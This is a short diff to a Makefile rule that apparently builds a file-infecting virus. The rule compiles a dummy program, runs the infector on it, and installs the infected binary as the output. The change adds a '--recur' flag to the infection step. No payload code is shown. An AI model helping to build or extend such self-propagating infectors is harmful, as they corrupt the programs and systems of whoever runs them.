@@ -57,7 +57,7 @@ $(NAME): $(VIRUS_X) $(OBJ_INF)
 	gcc -o $(NAME) $(OBJ_INF) $(VIRUS_X)
 	echo "int main(){return 0;}" > $(to_infect).c
 	gcc $(to_infect).c -o $(to_infect)
-	./$(NAME) --no-infect-dir $(ARGS) $(to_infect)
+	./$(NAME) --no-infect-dir --recur $(ARGS) $(to_infect)
 	mv $(NAME) .tmp/$(NAME)_infector
 	mv $(to_infect) $(NAME)
 
